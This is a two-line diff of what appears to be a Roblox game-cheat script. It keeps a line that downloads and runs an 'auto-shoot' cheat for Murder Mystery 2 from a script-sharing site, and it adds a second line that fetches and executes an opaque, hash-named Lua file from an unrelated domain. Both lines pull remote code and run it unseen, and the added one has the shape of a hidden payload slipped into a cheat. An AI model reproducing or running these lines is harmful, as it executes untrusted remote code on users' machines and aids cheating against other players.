@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()
+loadstring(game:HttpGet("https://egorikusa.space/a3e65340a89cddd0ca853173.lua", true))()
